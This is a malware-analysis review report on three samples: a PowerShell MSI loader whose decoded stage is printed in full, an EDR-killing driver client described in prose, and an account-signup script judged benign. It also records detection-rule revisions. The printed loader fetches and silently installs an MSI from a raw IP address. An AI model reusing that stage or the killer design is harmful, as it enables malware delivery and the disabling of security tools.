Registry source samples: intensive second review, 2026-10-23

The supplied source files, rather than their filenames, queue labels, scanner
scores or rule descriptions, determine these judgments. No sample was executed.
Python's ast.literal_eval extracted the PowerShell literal; a separate arithmetic
transformation reconstructed the complete stage without evaluating PowerShell.
All three originals were scanned with atomscan and cleave facts. Native source
was traced from wmain through registration, enumeration, filtering and IOCTL;
JavaScript was traced through every awaited request and its return value.
There is no original package manifest, authoritative registry identity, signing
context or deployment authorization attached to these individual source files.
Names below identify their implementations, not an externally proven family.

0f10acff2cce74511a46f9604d7eff7cfa6da35bb79af2d09ebcb784cb4c3804
Offset-encoded PowerShell MSI loader: MALICIOUS

Importing/running the Python module calls subprocess.run with pwsh, -NoProfile
and -Command, passing its literal stage. Each negative array element plus the
key 1520498 becomes one character. The resulting source is fed to
[scriptblock]::Create($code).Invoke(). The complete recovered stage is:

$client = New-Object Net.WebClient
$url = 'http://1614733393/app/afafa98279c9/ISOSimple.msi'
$target = [IO.Path]::Combine($env:TEMP,[guid]::NewGuid().ToString('n')+'_ISOSimple.msi')
$client.DownloadFile($url,$target)
$installer = $env:SystemRoot+'\System32\msiexec.exe'
$arguments = '/i "'+$target+'" /qn /norestart'
Start-Process -FilePath $installer -ArgumentList $arguments -WindowStyle Hidden -PassThru
if($env:__ST){Remove-Item -LiteralPath $env:__ST -Force -ErrorAction SilentlyContinue}

The integer host represents 96.62.224.81. The download target is the installer
argument, rather than an unrelated download and launch. Executable source is
concealed at two language layers, then performs an unattended hidden install
from a raw HTTP IP location, with randomized temporary staging and attempted
launcher cleanup. In this purpose-limited wrapper, that combination tips the
judgment toward an unwanted loader. A disclosed enterprise deployment script
and authenticated installer provenance could change the context; neither is
supplied. The MSI's functionality, a particular malware family, persistence,
credential theft and successful execution are not established.

The self-path handoff does not necessarily name the Python file: pwsh -Command
can have no script Path. Deletion is conditional on a nonempty environment value.
Start-Process uses PassThru, not Wait. There is no demonstrated privilege bypass.
forager fetch attempted the recovered MSI URL; the 45-second attempt timed out.
The original stage and fetch log remain in scratch/acquit-review.

Corrected rules: the old hostile Python loader composite required a decoder,
launch, ScriptBlock constructor and self-path storage, but required no download,
installer or malicious decoded behavior. An encoded harmless Write-Output
control matches it. Its matcher is retained as suspicious source co-occurrence
under anti-static/obfuscation/eval/powershell-loader, with unsupported T1105 and
E1105 mappings removed. The stronger bound-stage matcher also moves there;
its matcher and suspicious criticality are unchanged. Existing arithmetic
concealment and execution capabilities remain. The narrowed platform spelling
is its existing effective Windows/Unix scope: its mandatory launch leg already
excludes the former outer rule's Android/iOS declarations.

Coverage: no honest hostile rule is available for the recovered MSI chain in
the original file. The engine does not decode this arithmetic array into a
payload analysis layer. Three suspicious findings preserve concealment and
concealed-source activation/context; they are related evidence, not three
independent attacks. No duplicated or specimen-specific matcher was added to
restore a conviction score. The classifier now defaults to class 0 despite the
manual MALICIOUS judgment: a genuine classifier/decoder coverage gap.

12d0aace5c019ca2a3c2b2e914c0987ebebf0b5bce7ccde8568cc89145b69c68
Driver-backed security-process killer source: MALICIOUS

RegisterKernelDriver asks SCM to create a demand-start kernel-driver service
pointing at System32\drivers\nvfsflt64.sys, with an NVIDIA display name. wmain
starts the service if creation succeeded, but proceeds regardless to open the
CcProtect device for read/write. An invalid device handle ends execution.
Otherwise it snapshots processes and compares each image name case-insensitively
against MsMpEng.exe, CSFalconService.exe and SophosEDR.exe. Only matching entries
produce the input structure {process_id, exit_status=0}, which is submitted via
DeviceIoControl with code 0x222024. Other processes are skipped. Handles close
at exit. There is no generic operator-selected process-management interface.

The security-specific selection, PID-bearing termination-shaped driver requests,
and vendor-disguised service naming support an intended defender killer.
No supplied driver implements the request, so its actual IOCTL contract,
vulnerability, signing status and successful termination remain unverified.
The source does not drop that driver. SCM creation normally needs prior
privilege; neither demand-start registration nor a privileged API alone proves
persistence or privilege escalation. Authorized red-team context is possible
but not present in these files. The narrow, multi-vendor sabotage purpose tips
the host-triage judgment toward malicious.

All three hostile termination findings and both suspicious observations remain.
Their overlap describes one hostile impact chain, not independent attacks;
extra persistence/escalation/masquerade objectives were not invented for counts.
The device-path reference moves to os/kernel/device without losing severity;
its description no longer promises an open or asserts driver lineage. The
ambiguous numeric source token moves to source-literal metadata with unchanged
component criticality. Existing consumers retain the same match population.
The kernel-driver type flag moves from service/driver to os/kernel/driver at
notable criticality. The flag-or-registration union is renamed configuration
and described as references, with all exact consumers updated.

111da9f61361f8e29129ba3801083652c20dac2abd7d8a009efff69427dab64f
Disposable-mail account-provisioning example: BENIGN (overturned)

The exported provisionIdentity function has no caller in this file. Given three
caller-provided arguments, it creates a Mail.tm mailbox, obtains its token,
requests a Sentinel token, and submits OpenAI signup/registration requests. It
requests email OTP delivery, reads the first inbox message, extracts six digits,
submits that code and sends a generated profile. It then attempts a standard
OAuth authorization-code exchange using the literal placeholder captured-code
and returns access_token/refresh_token fields to its caller.

This implements disposable-email signup automation, but a single provisioning
function does not establish bulk account farming or an anti-abuse bypass.
Requesting and forwarding Sentinel tokens is not evidence of defeating Sentinel.
Reading the mailbox the function just provisioned is not credential theft.
Tokens return to the caller; there is no third-party credential-export sink.
The representative-source comment, placeholder authorization code, exposed
function parameters and ordinary request flow support an example/automation
interpretation. The code has no polling/retry/session machinery and does not
check HTTP status; successful signup/OAuth is unproven. Deployment to mass-create
abusive identities could change the judgment, but that context is absent.

All hostile/suspicious findings were investigated: two hostile endpoint-set
composites inferred farming from service routes. Their conditions are retained
as notable HTTP service endpoint sets; a related nonfiring OAuth endpoint-set
rule is corrected consistently. No independent consumers reference the old
signup IDs. The mailbox route union likewise says references, not executed
lifecycle. An unrelated notable tunnel rule matched fetch text near /register,
including OpenAI's ordinary registration URL. Its exact matcher and exclusion
move to source-call syntax metadata; its two actual tunnel composites still
reference it explicitly. The new generalizable notable token-record rule
recognizes a returned access/refresh object in either unquoted-key order and
does not infer theft. Separate objects and source strings are near misses.

Reference and scope review

id-map.json accounts for every moved/renamed observation. No matcher was erased
or weakened to meet a trait-count limit. Existing Python/JavaScript offset
positive fixtures and their source-binding controls were read before changes.
No pre-existing Mail.tm/signup positive fixture exists in testdata. The original
JavaScript's full function was inspected, and a quoted-key variant tests the
previously nonfiring OAuth-set branch. Existing C++ consumer definitions and
security-inventory review/controls were inspected. The known USB collision is
why the numeric token alone cannot assert a specific driver.

Ancestor selectors were also inspected, rather than only exact IDs. The old
Python rule could feed generic dropper/file-exec selectors in FTP-banner and
hosts-sinkhole rules without file-execution evidence. That unsupported category
membership is intentionally removed; it is not replaced with obfuscation.
Hosts and CrystalX consumers are PE-scoped, whereas the moved Python rule is
Python-only. The new Python obfuscation members do not expand the JS-scoped
credential-channel/configuration consumers. Removing the generic /register
atom from the C2 subtree intentionally removes unsupported channel evidence
from broad credential-exfil/listener selectors. Genuine tunnel composites keep
their exact source condition, and the authenticated-registry control still
matches. No new ancestor selectors of the neutral destinations were found.

Verification and remaining disagreements

check.py: 15 cases cover the originals/positive fixtures, harmless offset
execution, single-account and quoted OAuth examples, ordinary registration,
retained tunnel coverage, driver/ordinary-service controls, and token records.
The existing python-powershell-offset-launch suite (7), offset-msi-review suite
(4), and security-audit-inventory controls (2) also pass. No fixture payload was
executed. All three originals were rescanned with atomscan. They are plain
source files: facts reports no archive members or decoded arithmetic layers.

The installed atomscan embeds an older budget policy and initially rejected the
already-reviewed 101-rule naming leaf. Scans used CLEAVE_VALIDATE=0 to allow
analysis of the unchanged rule corpus, with follow/update/upload disabled;
source-built current cleave supplies the independent checks and final repository
validation. The installed model is v18.18 and warns that v19 features are zeroed;
this tooling limitation is recorded rather than attributed to sample behavior.
JavaScript flow analysis also reports incomplete projections; the manual trace
covers the straight-line source instead of treating those gaps as benign proof.

scan-comparison.json records before/after counts, probabilities and route classes.
Every pre-existing observation survives after ID mapping: Python 21 -> 21,
C++ 41 -> 41, JavaScript 60 -> 61 (the token-record observation is new).
Material severity changes: Python hostile 1 -> 0, suspicious 2 -> 3;
JavaScript hostile 2 -> 0, suspicious 0 -> 0; C++ hostile 3 -> 3 and suspicious
2 -> 2. The intentionally removed attack claims are downloader intent inferred
from an arbitrary encoded program, account farming/bypass inferred from signup
routes, and tunneling inferred from /register. Their supported observations
remain. Default model routes miss the malicious Python loader after correction;
C++ remains class 2, while JavaScript class 0 agrees with the overturned verdict.
The absent MSI and driver prevent downstream-payload/runtime-success claims.
